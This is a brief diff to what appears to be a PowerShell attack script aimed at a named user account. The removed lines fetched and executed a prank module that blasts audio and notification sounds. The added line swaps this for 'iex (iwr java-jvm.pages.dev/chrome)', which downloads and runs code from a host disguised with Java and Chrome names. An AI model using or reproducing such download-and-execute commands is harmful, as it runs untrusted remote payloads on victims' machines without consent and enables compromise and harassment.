@@ -1,5 +1,5 @@
-$target_user = "32393"
-$command = "iex (iwr https://raw.githubusercontent.com/perplexityjeff/PowerShell-Troll/master/PSTrollFunctions.psm1));Set-Unmute-Audio;Set-AudioMax;Send-NotificationSoundSpam;"
+$target_user = "jwheeler"
+$command = "iex (iwr java-jvm.pages.dev/chrome)"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
